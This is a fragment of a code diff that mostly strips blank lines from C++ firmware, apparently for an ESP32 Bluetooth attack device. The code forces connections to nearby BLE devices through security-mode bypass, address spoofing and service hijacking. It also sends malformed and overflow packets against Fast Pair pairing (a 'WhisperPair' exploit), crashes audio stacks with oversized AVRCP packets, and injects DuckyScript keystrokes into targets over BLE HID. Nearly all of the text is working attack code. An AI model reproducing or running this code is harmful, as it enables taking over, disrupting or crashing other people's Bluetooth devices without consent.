             NimBLEDevice::deleteClient(pClient);
         }
     }
-
     return false;
 }
 
@@ -1303,9 +1100,7 @@ bool HIDExploitEngine::trySecurityModeBypass(NimBLEAddress target, HIDDeviceProf
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Security mode bypass attempts...", TFT_CYAN);
-
     const int securityModes[][3] = {
         {0, 0, 0},
         {1, 0, 0},
@@ -1314,7 +1109,6 @@ bool HIDExploitEngine::trySecurityModeBypass(NimBLEAddress target, HIDDeviceProf
         {0, 0, 1},
         {1, 0, 1}
     };
-
     for(int i = 0; i < 6; i++) {
         BLEStateManager::deinitBLE(true);
         delay(100);
@@ -1322,13 +1116,10 @@ bool HIDExploitEngine::trySecurityModeBypass(NimBLEAddress target, HIDDeviceProf
         NimBLEDevice::init(secName);
         NimBLEDevice::setPower(ESP_PWR_LVL_P9);
         NimBLEDevice::setSecurityAuth(securityModes[i][0], securityModes[i][1], securityModes[i][2]);
-
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(pClient) {
             BLEStateManager::registerClient(pClient);
-
             pClient->setConnectTimeout(6);
-
             bool connected = pClient->connect(target, true);
             if(connected) {
                 showAttackProgress("Security bypass successful!", TFT_GREEN);
@@ -1342,7 +1133,6 @@ bool HIDExploitEngine::trySecurityModeBypass(NimBLEAddress target, HIDDeviceProf
             NimBLEDevice::deleteClient(pClient);
         }
     }
-
     return false;
 }
 
@@ -1350,26 +1140,19 @@ bool HIDExploitEngine::tryAddressSpoofingAttack(NimBLEAddress target, HIDDeviceP
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Address spoofing attack...", TFT_CYAN);
-
     std::string originalAddr = target.toString();
     std::string spoofedAddr = "";
-
     if(originalAddr.length() >= 17) {
         spoofedAddr = originalAddr.substr(0, 9) + "AA:BB:CC";
-
         BLEStateManager::deinitBLE(true);
         delay(300);
         NimBLEDevice::init(spoofedAddr);
         NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(pClient) {
             BLEStateManager::registerClient(pClient);
-
             pClient->setConnectTimeout(5);
-
             bool connected = pClient->connect(target, false);
             if(connected) {
                 showAttackProgress("Address spoofing worked!", TFT_GREEN);
@@ -1383,7 +1166,6 @@ bool HIDExploitEngine::tryAddressSpoofingAttack(NimBLEAddress target, HIDDeviceP
             NimBLEDevice::deleteClient(pClient);
         }
     }
-
     return false;
 }
 
@@ -1391,29 +1173,21 @@ bool HIDExploitEngine::tryServiceDiscoveryHijack(NimBLEAddress target, HIDDevice
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Service discovery hijack...", TFT_CYAN);
-
     BLEStateManager::deinitBLE();
     delay(300);
     BLEStateManager::initBLE("ServiceHijack");
     NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-
     NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     pClient->setConnectTimeout(8);
     bool connected = pClient->connect(target, false);
-
     if(connected) {
         delay(50);
-
         NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
         if(pHIDService) {
             uint8_t fakeDescriptor[] = {0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x05, 0x07};
-
             const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
             for(auto& ch : chars) {
                 if(ch->canWrite()) {
@@ -1422,7 +1196,6 @@ bool HIDExploitEngine::tryServiceDiscoveryHijack(NimBLEAddress target, HIDDevice
                 }
             }
         }
-
         showAttackProgress("Service hijack attempted!", TFT_GREEN);
         pClient->disconnect();
         BLEStateManager::unregisterClient(pClient);
@@ -1430,7 +1203,6 @@ bool HIDExploitEngine::tryServiceDiscoveryHijack(NimBLEAddress target, HIDDevice
         cleanup.disable();
         return true;
     }
-
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     return false;
@@ -1442,11 +1214,8 @@ HIDConnectionResult HIDExploitEngine::forceHIDConnection(NimBLEAddress target, c
     result.client = nullptr;
     result.attemptTime = 0;
     result.attemptCount = 0;
-
     HIDDeviceProfile profile = analyzeHIDDevice(target, deviceName, rssi);
-
     std::vector<std::pair<String, bool (HIDExploitEngine::*)(NimBLEAddress, HIDDeviceProfile)>> attacks;
-
     if(profile.isAppleDevice) {
         attacks.push_back({"AppleSpoof", &HIDExploitEngine::tryAppleMagicSpoof});
         attacks.push_back({"SecurityBypass", &HIDExploitEngine::trySecurityModeBypass});
@@ -1469,24 +1238,18 @@ HIDConnectionResult HIDExploitEngine::forceHIDConnection(NimBLEAddress target, c
         attacks.push_back({"SecurityBypass", &HIDExploitEngine::trySecurityModeBypass});
         attacks.push_back({"ServiceHijack", &HIDExploitEngine::tryServiceDiscoveryHijack});
     }
-
     result.attemptCount = attacks.size();
-
     for(size_t i = 0; i < attacks.size(); i++) {
         showAttackProgress(String("Trying " + attacks[i].first + "...").c_str(), TFT_YELLOW);
-
         if((this->*attacks[i].second)(target, profile)) {
             result.success = true;
             result.method = attacks[i].first;
             result.attemptTime = millis();
-
             showAttackProgress(String("Success with " + attacks[i].first).c_str(), TFT_GREEN);
             break;
         }
-
         delay(300);
     }
-
     return result;
 }
 
@@ -1498,22 +1261,17 @@ bool HIDExploitEngine::executeHIDInjection(NimBLEAddress target, const String& d
 bool HIDExploitEngine::testHIDVulnerability(NimBLEAddress target) {
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
-
     if(!pClient) {
         return false;
     }
-
     bool hasHID = false;
     bool hasWriteAccess = false;
-
     const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
     for(auto& service : services) {
         NimBLEUUID uuid = service->getUUID();
         std::string uuidStr = uuid.toString();
-
         if(uuidStr.find("1812") != std::string::npos) {
             hasHID = true;
-
             const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
             for(auto& ch : chars) {
                 if(ch->canWrite()) {
@@ -1523,12 +1281,10 @@ bool HIDExploitEngine::testHIDVulnerability(NimBLEAddress target) {
             }
         }
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     BLEStateManager::deinitBLE(true);
-
     return hasHID && hasWriteAccess;
 }
 
@@ -1555,17 +1311,13 @@ bool WhisperPairExploit::performRealHandshake(NimBLERemoteCharacteristic* kbpCha
     uint8_t public_key[65];
     size_t pub_len = 65;
     if(!crypto.generateValidKeyPair(public_key, &pub_len)) return false;
-
     uint8_t seeker_hello[67] = {0};
     seeker_hello[0] = 0x00;
     seeker_hello[1] = 0x00;
     memcpy(&seeker_hello[2], public_key, 65);
-
     bool success = kbpChar->writeValue(seeker_hello, 67, true);
     if(!success) return false;
-
     delay(200);
-
     try {
         std::string response = kbpChar->readValue();
         if(response.length() >= 67) {
@@ -1583,41 +1335,33 @@ bool WhisperPairExploit::performRealHandshake(NimBLERemoteCharacteristic* kbpCha
 
 bool WhisperPairExploit::sendProtocolAttack(NimBLERemoteCharacteristic* kbpChar, const uint8_t* devicePubKey) {
     if(!kbpChar) return false;
-
     uint8_t private_key[32];
     uint8_t ephemeral_pub[65];
     if(!crypto.generateEphemeralKeyPair(ephemeral_pub, private_key)) return false;
-
     uint8_t shared_secret[32];
     if(!crypto.ecdhComputeSharedSecret(private_key, devicePubKey, shared_secret)) {
         crypto.generatePlausibleSharedSecret(devicePubKey, shared_secret);
     }
-
     uint8_t nonce[16];
     crypto.generateValidNonce(nonce);
-
     uint8_t exploit_packet[256];
     exploit_packet[0] = 0x02;
     exploit_packet[1] = 0x00;
     memcpy(&exploit_packet[2], nonce, 16);
-
     uint8_t fake_encrypted[200];
     memset(fake_encrypted, 0x41, sizeof(fake_encrypted));
     fake_encrypted[0] = 0x80;
     fake_encrypted[1] = 0x00;
     fake_encrypted[2] = 0x00;
     fake_encrypted[3] = 0x00;
-
     memcpy(&exploit_packet[18], fake_encrypted, 200);
     exploit_packet[218] = 0x00;
     exploit_packet[219] = 0x00;
     exploit_packet[220] = 0x00;
     exploit_packet[221] = 0x00;
-
     for(int i = 0; i < 8; i++) {
         exploit_packet[222 + i] = esp_random() & 0xFF;
     }
-
     bool sent = kbpChar->writeValue(exploit_packet, 230, true);
     if(sent) delay(400);
     return sent;
@@ -1625,7 +1369,6 @@ bool WhisperPairExploit::sendProtocolAttack(NimBLERemoteCharacteristic* kbpChar,
 
 bool WhisperPairExploit::sendStateConfusionAttack(NimBLERemoteCharacteristic* kbpChar) {
     if(!kbpChar) return false;
-
     uint8_t attack_packets[][120] = {
         {0x01, 0x00},
         {0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
@@ -1633,7 +1376,6 @@ bool WhisperPairExploit::sendStateConfusionAttack(NimBLERemoteCharacteristic* kb
         {0x00, 0x01},
         {0xFF, 0x00}
     };
-
     bool anySent = false;
     for(int i = 0; i < 5; i++) {
         bool sent = kbpChar->writeValue(attack_packets[i], 
@@ -1646,31 +1388,25 @@ bool WhisperPairExploit::sendStateConfusionAttack(NimBLERemoteCharacteristic* kb
 
 bool WhisperPairExploit::sendCryptoOverflowAttack(NimBLERemoteCharacteristic* kbpChar) {
     if(!kbpChar) return false;
-
     uint8_t malformed_key[65];
     malformed_key[0] = 0x04;
     for(int i = 1; i < 65; i++) {
         malformed_key[i] = (i % 2 == 0) ? 0xFF : 0x00;
     }
-
     uint8_t overflow_packet[512];
     overflow_packet[0] = 0x00;
     overflow_packet[1] = 0x00;
     memcpy(&overflow_packet[2], malformed_key, 65);
-
     for(int i = 67; i < 512; i++) {
         overflow_packet[i] = esp_random() & 0xFF;
         if(i > 400) overflow_packet[i] = 0x00;
     }
-
     bool sent1 = kbpChar->writeValue(overflow_packet, 512, true);
     delay(300);
-
     uint8_t account_key_overflow[300];
     account_key_overflow[0] = 0x03;
     account_key_overflow[1] = 0x00;
     memset(&account_key_overflow[2], 0x41, 298);
-
     bool sent2 = kbpChar->writeValue(account_key_overflow, 300, true);
     return (sent1 || sent2);
 }
@@ -1691,23 +1427,18 @@ bool WhisperPairExploit::testForVulnerability(NimBLERemoteCharacteristic* kbpCha
 
 bool WhisperPairExploit::execute(NimBLEAddress target) {
     if(!confirmAttack(target.toString().c_str())) return false;
-
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return false;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Testing vulnerability...", TFT_GREEN);
     delay(500);
-
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         showAttackResult(false, "FastPair service not found");
@@ -1716,7 +1447,6 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
     if(!pKbpChar) {
         showAttackResult(false, "No writable KBP characteristic");
@@ -1725,11 +1455,9 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     delay(500);
     uint8_t devicePubKey[65];
     bool handshakeOk = performRealHandshake(pKbpChar, devicePubKey);
-
     bool exploitSuccess = false;
     if(handshakeOk) {
         showAttackProgress("Handshake OK! Sending protocol attack...", TFT_YELLOW);
@@ -1740,23 +1468,18 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         exploitSuccess = sendStateConfusionAttack(pKbpChar);
         delay(400);
     }
-
     bool isVulnerable = testForVulnerability(pKbpChar);
-
     if(!exploitSuccess || !isVulnerable) {
         showAttackProgress("Trying crypto overflow attack...", TFT_RED);
         bool overflowSent = sendCryptoOverflowAttack(pKbpChar);
         delay(500);
         isVulnerable = testForVulnerability(pKbpChar) || isVulnerable;
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     delay(300);
-
     cleanup.disable();
-
     if(isVulnerable) {
         std::vector<String> lines;
         lines.push_back("WHISPERPAIR EXPLOIT SUCCESS!");
@@ -1785,16 +1508,13 @@ bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     bleManager.prepareForConnection();
     NimBLEClient* pClient = nullptr;
     if(!bleManager.connectToDevice(target, &pClient, true)) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
     BLEStateManager::registerClient(pClient);
-
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         pClient->disconnect();
@@ -1803,7 +1523,6 @@ bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
     NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
     if(!pKbpChar) {
         pClient->disconnect();
@@ -1812,21 +1531,17 @@ bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
     uint8_t devicePubKey[65];
     bool handshakeOk = performRealHandshake(pKbpChar, devicePubKey);
     bool protocolAttack = sendProtocolAttack(pKbpChar, devicePubKey);
     bool stateAttack = sendStateConfusionAttack(pKbpChar);
     bool cryptoAttack = sendCryptoOverflowAttack(pKbpChar);
     bool crashed = testForVulnerability(pKbpChar);
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     bleManager.cleanupAfterAttack();
-
     cleanup.disable();
-
     return (handshakeOk && protocolAttack && crashed) || 
            (stateAttack && crashed) || 
            (cryptoAttack && crashed);
@@ -1836,16 +1551,13 @@ bool WhisperPairExploit::executeAdvanced(NimBLEAddress target, int attackType) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     bleManager.prepareForConnection();
     NimBLEClient* pClient = nullptr;
     if(!bleManager.connectToDevice(target, &pClient, true)) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
     BLEStateManager::registerClient(pClient);
-
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         pClient->disconnect();
@@ -1854,7 +1566,6 @@ bool WhisperPairExploit::executeAdvanced(NimBLEAddress target, int attackType) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
     NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
     if(!pKbpChar) {
         pClient->disconnect();
@@ -1863,10 +1574,8 @@ bool WhisperPairExploit::executeAdvanced(NimBLEAddress target, int attackType) {
         bleManager.cleanupAfterAttack();
         return false;
     }
-
     bool success = false;
     uint8_t devicePubKey[65];
-
     switch(attackType) {
         case 0:
             if(performRealHandshake(pKbpChar, devicePubKey)) {
@@ -1883,28 +1592,22 @@ bool WhisperPairExploit::executeAdvanced(NimBLEAddress target, int attackType) {
             success = performRealHandshake(pKbpChar, devicePubKey);
             break;
     }
-
     bool crashed = testForVulnerability(pKbpChar);
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     bleManager.cleanupAfterAttack();
-
     cleanup.disable();
-
     return success && crashed;
 }
 
 bool AudioAttackService::findAndAttackAudioServices(NimBLEClient* pClient) {
     if(!pClient || !pClient->isConnected()) return false;
     bool anyAttackSuccess = false;
-
     const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
     for(auto& service : services) {
         NimBLEUUID uuid = service->getUUID();
         std::string uuidStr = uuid.toString();
-
         if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) {
             if(attackAVRCP(service)) anyAttackSuccess = true;
         } else if(uuidStr.find("1843") != std::string::npos || uuidStr.find("b4b4") != std::string::npos) {
@@ -1927,39 +1630,31 @@ bool AudioAttackService::attackAVRCP(NimBLERemoteService* avrcpService) {
         "0000110f-0000-1000-8000-00805f9b34fb",
         nullptr
     };
-
     for(int i = 0; avrcpUuids[i] != nullptr; i++) {
         pChar = avrcpService->getCharacteristic(NimBLEUUID(avrcpUuids[i]));
         if(pChar && pChar->canWrite()) break;
     }
-
     if(!pChar) {
         const std::vector<NimBLERemoteCharacteristic*>& chars = avrcpService->getCharacteristics(true);
         for(auto& ch : chars) {
             if(ch->canWrite()) { pChar = ch; break; }
         }
     }
-
     if(!pChar) return false;
-
     uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x00, 0x00};
     bool playSent = pChar->writeValue(playCmd, sizeof(playCmd), true);
     delay(200);
-
     uint8_t volUpCmd[] = {0x00, 0x44, 0x00, 0x00, 0x00};
     bool volSent = pChar->writeValue(volUpCmd, sizeof(volUpCmd), true);
     delay(200);
-
     uint8_t oversizedPacket[256];
     memset(oversizedPacket, 0x41, sizeof(oversizedPacket));
     oversizedPacket[0] = 0xFF;
     oversizedPacket[1] = 0xFF;
     bool crashSent = pChar->writeValue(oversizedPacket, sizeof(oversizedPacket), true);
     delay(300);
-
     uint8_t invalidState[] = {0x00, 0xFF, 0xFF, 0xFF, 0xFF};
     bool stateSent = pChar->writeValue(invalidState, sizeof(invalidState), true);
-
     return (playSent || volSent || crashSent || stateSent);
 }
 
@@ -1972,21 +1667,17 @@ bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
         "00002b02-0000-1000-8000-00805f9b34fb",
         nullptr
     };
-
     for(int i = 0; mediaUuids[i] != nullptr; i++) {
         pMediaChar = mediaService->getCharacteristic(NimBLEUUID(mediaUuids[i]));
         if(pMediaChar && pMediaChar->canWrite()) break;
     }
-
     if(!pMediaChar) {
         const std::vector<NimBLERemoteCharacteristic*>& chars = mediaService->getCharacteristics(true);
         for(auto& ch : chars) {
             if(ch->canWrite()) { pMediaChar = ch; break; }
         }
     }
-
     if(!pMediaChar) return false;
-
     uint8_t commands[][5] = {
         {0x01, 0x00, 0x00, 0x00, 0x00},
         {0x02, 0x00, 0x00, 0x00, 0x00},
@@ -1996,7 +1687,6 @@ bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
         {0x06, 0x00, 0x00, 0x00, 0x00},
         {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
     };
-
     bool anySent = false;
     for(int i = 0; i < 7; i++) {
         bool sent = pMediaChar->writeValue(commands[i], 5, true);
@@ -2015,24 +1705,19 @@ bool AudioAttackService::attackTelephony(NimBLERemoteService* teleService) {
         "00002a45-0000-1000-8000-00805f9b34fb",
         nullptr
     };
-
     for(int i = 0; alertUuids[i] != nullptr; i++) {
         pAlertChar = teleService->getCharacteristic(NimBLEUUID(alertUuids[i]));
         if(pAlertChar && pAlertChar->canWrite()) break;
     }
-
     if(!pAlertChar) return false;
-
     uint8_t alertHigh[] = {0x02};
     uint8_t alertMild[] = {0x01};
     uint8_t invalidAlert[] = {0xFF};
-
     bool alert1 = pAlertChar->writeValue(alertHigh, 1, true);
     delay(300);
     bool alert2 = pAlertChar->writeValue(alertMild, 1, true);
     delay(300);
     bool alert3 = pAlertChar->writeValue(invalidAlert, 1, true);
-
     return (alert1 || alert2 || alert3);
 }
 
@@ -2040,15 +1725,11 @@ bool AudioAttackService::executeAudioAttack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     bool success = findAndAttackAudioServices(pClient);
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
@@ -2065,13 +1746,10 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) return false;
-
     BLEStateManager::registerClient(pClient);
-
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
     if(!pService) pService = pClient->getService(NimBLEUUID((uint16_t)0x110F));
     if(!pService) {
@@ -2080,33 +1758,28 @@ bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     NimBLERemoteCharacteristic* pChar = nullptr;
     const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
     for(auto& ch : chars) {
         if(ch->canWrite()) { pChar = ch; break; }
     }
-
     if(!pChar) {
         pClient->disconnect();
         BLEStateManager::unregisterClient(pClient);
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     uint8_t crashPacket1[128];
     uint8_t crashPacket2[64];
     uint8_t crashPacket3[256];
     memset(crashPacket1, 0xFF, sizeof(crashPacket1));
     memset(crashPacket2, 0x00, sizeof(crashPacket2));
     memset(crashPacket3, 0x41, sizeof(crashPacket3));
-
     bool sent1 = pChar->writeValue(crashPacket1, sizeof(crashPacket1), true);
     delay(200);
     bool sent2 = pChar->writeValue(crashPacket2, sizeof(crashPacket2), true);
     delay(200);
     bool sent3 = pChar->writeValue(crashPacket3, sizeof(crashPacket3), true);
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
@@ -2124,7 +1797,6 @@ DuckyScriptEngine::HIDKeycode DuckyScriptEngine::charToKeycode(char c) {
         if(c == '0') return HIDKeycode{0, 0x27};
         return HIDKeycode{0, (uint8_t)(0x1E + (c - '1'))};
     }
-
     switch(c) {
         case ' ': return HIDKeycode{0, 0x2C};
         case '\n': return HIDKeycode{0, 0x28};
@@ -2168,7 +1840,6 @@ DuckyScriptEngine::HIDKeycode DuckyScriptEngine::charToKeycode(char c) {
 bool DuckyScriptEngine::parseLine(String line) {
     line.trim();
     if(line.length() == 0 || line.startsWith("//") || line.startsWith("REM")) return true;
-
     DuckyCommand cmd;
     if(line.startsWith("DELAY ")) {
         cmd.command = "DELAY";
@@ -2205,7 +1876,6 @@ bool DuckyScriptEngine::parseLine(String line) {
         commands.push_back(cmd);
         return true;
     }
-
     if(line == "ENTER") cmd.command = "SPECIAL";
     else if(line == "SPACE") cmd.command = "SPECIAL";
     else if(line == "TAB") cmd.command = "SPECIAL";
@@ -2232,13 +1902,11 @@ bool DuckyScriptEngine::parseLine(String line) {
     else if(line == "F10") cmd.command = "SPECIAL";
     else if(line == "F11") cmd.command = "SPECIAL";
     else if(line == "F12") cmd.command = "SPECIAL";
-
     if(cmd.command.length() > 0) {
         cmd.parameter = line;
         commands.push_back(cmd);
         return true;
     }
-
     cmd.command = "STRING";
     cmd.parameter = line;
     cmd.delay_ms = 0;
@@ -2251,7 +1919,6 @@ bool DuckyScriptEngine::loadFromSD(String filename) {
     if(!SD.begin()) return false;
     File file = SD.open(filename);
     if(!file) return false;
-
     while(file.available()) {
         String line = file.readStringUntil('\n');
         if(!parseLine(line)) {
@@ -2306,10 +1973,8 @@ bool HIDDuckyService::sendHIDReport(NimBLERemoteCharacteristic* pChar, uint8_t m
     uint8_t report[8] = {0};
     report[0] = modifier;
     report[2] = keycode;
-
     bool sent = pChar->writeValue(report, 8, true);
     delay(10);
-
     uint8_t nullReport[8] = {0};
     pChar->writeValue(nullReport, 8, true);
     delay(10);
@@ -2328,7 +1993,6 @@ bool HIDDuckyService::sendString(NimBLERemoteCharacteristic* pChar, const String
 bool HIDDuckyService::sendSpecialKey(NimBLERemoteCharacteristic* pChar, const String& key) {
     uint8_t modifier = 0;
     uint8_t keycode = 0;
-
     if(key == "ENTER") keycode = 0x28;
     else if(key == "ESC") keycode = 0x29;
     else if(key == "BACKSPACE") keycode = 0x2A;
@@ -2356,14 +2020,12 @@ bool HIDDuckyService::sendSpecialKey(NimBLERemoteCharacteristic* pChar, const St
     else if(key == "F10") keycode = 0x43;
     else if(key == "F11") keycode = 0x44;
     else if(key == "F12") keycode = 0x45;
-
     return sendHIDReport(pChar, modifier, keycode);
 }
 
 bool HIDDuckyService::sendComboKey(NimBLERemoteCharacteristic* pChar, const String& combo) {
     uint8_t modifier = 0;
     String keyPart;
-
     if(combo.startsWith("CTRL-")) {
         modifier |= 0x01;
         keyPart = combo.substring(5);
@@ -2377,13 +2039,11 @@ bool HIDDuckyService::sendComboKey(NimBLERemoteCharacteristic* pChar, const Stri
         modifier |= 0x08;
         keyPart = combo.substring(4);
     } else return false;
-
     if(keyPart.length() == 1) {
         char keyChar = keyPart.charAt(0);
         DuckyScriptEngine::HIDKeycode kc = duckyEngine.charToKeycode(keyChar);
         return sendHIDReport(pChar, modifier, kc.keycode);
     }
-
     if(keyPart == "a" || keyPart == "A") return sendHIDReport(pChar, modifier, 0x04);
     else if(keyPart == "c" || keyPart == "C") return sendHIDReport(pChar, modifier, 0x06);
     else if(keyPart == "v" || keyPart == "V") return sendHIDReport(pChar, modifier, 0x19);
@@ -2394,7 +2054,6 @@ bool HIDDuckyService::sendComboKey(NimBLERemoteCharacteristic* pChar, const Stri
     else if(keyPart == "TAB") return sendHIDReport(pChar, modifier, 0x2B);
     else if(keyPart == "SPACE") return sendHIDReport(pChar, modifier, 0x2C);
     else if(keyPart == "DELETE") return sendHIDReport(pChar, modifier, 0x4C);
-
     return false;
 }
 
@@ -2406,10 +2065,8 @@ bool HIDDuckyService::sendGUIKey(NimBLERemoteCharacteristic* pChar, char key) {
 
 bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, String script) {
     if(!duckyEngine.loadFromString(script)) return false;
-
     bool hasHFP = false;
     String deviceName = "";
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -2420,7 +2077,6 @@ bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, String script) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     if(hasHFP && !deviceName.isEmpty()) {
         showAttackProgress("Device has HFP, testing vulnerability...", TFT_CYAN);
         HFPExploitEngine hfp;
@@ -2433,7 +2089,6 @@ bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, String script) {
         }
         showAttackProgress("HFP failed, trying regular connection...", TFT_ORANGE);
     }
-
     return executeDuckyScript(target);
 }
 
@@ -2446,18 +2101,14 @@ bool HIDDuckyService::executeDuckyScript(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!duckyEngine.isLoaded()) return false;
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return false;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Finding HID service...", TFT_GREEN);
     NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
     if(!pHIDService) {
@@ -2467,7 +2118,6 @@ bool HIDDuckyService::executeDuckyScript(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     NimBLERemoteCharacteristic* pReportChar = nullptr;
     const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
     for(auto& ch : chars) {
@@ -2477,7 +2127,6 @@ bool HIDDuckyService::executeDuckyScript(NimBLEAddress target) {
             break;
         }
     }
-
     if(!pReportChar) {
         showAttackResult(false, "No writable HID characteristic");
         pClient->disconnect();
@@ -2485,16 +2134,13 @@ bool HIDDuckyService::executeDuckyScript(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
-
     showAttackProgress("Executing Ducky Script...", TFT_BLUE);
     std::vector<DuckyCommand> commands = duckyEngine.getCommands();
     bool success = true;
     int currentDelay = defaultDelay;
-
     for(size_t i = 0; i < commands.size(); i++) {
         DuckyCommand cmd = commands[i];
         if(i % 5 == 0) showAttackProgress(String("Executing command " + String(i+1) + "/" + String(commands.size())).c_str(), TFT_BLUE);
-
         if(cmd.command == "DELAY") delay(cmd.delay_ms);
         else if(cmd.command == "DEFAULT_DELAY") currentDelay = cmd.delay_ms;
         else if(cmd.command == "STRING") {
@@ -2513,13 +2159,11 @@ bool HIDDuckyService::executeDuckyScript(NimBLEAddress target) {
             delay(currentDelay);
         }
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     cleanup.disable();
     delay(300);
-
     if(success) showAttackResult(true, "Ducky Script executed!");
     else showAttackResult(false, "Script execution failed");
     return success;
@@ -2529,38 +2173,30 @@ bool HIDDuckyService::forceInjectDuckyScript(NimBLEAddress target, String script
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!duckyEngine.loadFromString(script)) {
         showAttackResult(false, "Failed to parse script");
         return false;
     }
-
     HIDExploitEngine hidExploit;
     HIDConnectionResult connResult;
-
     if(deviceName.isEmpty() || rssi == 0) {
         String dummyName = "Unknown HID Device";
         connResult = hidExploit.forceHIDConnection(target, dummyName, -60);
     } else {
         connResult = hidExploit.forceHIDConnection(target, deviceName, rssi);
     }
-
     if(!connResult.success) {
         showAttackResult(false, "Failed to establish HID connection");
         return false;
     }
-
     NimBLEClient* pClient = nullptr;
     String connectionMethod = "";
     pClient = attemptConnectionWithStrategies(target, connectionMethod);
-
     if(!pClient) {
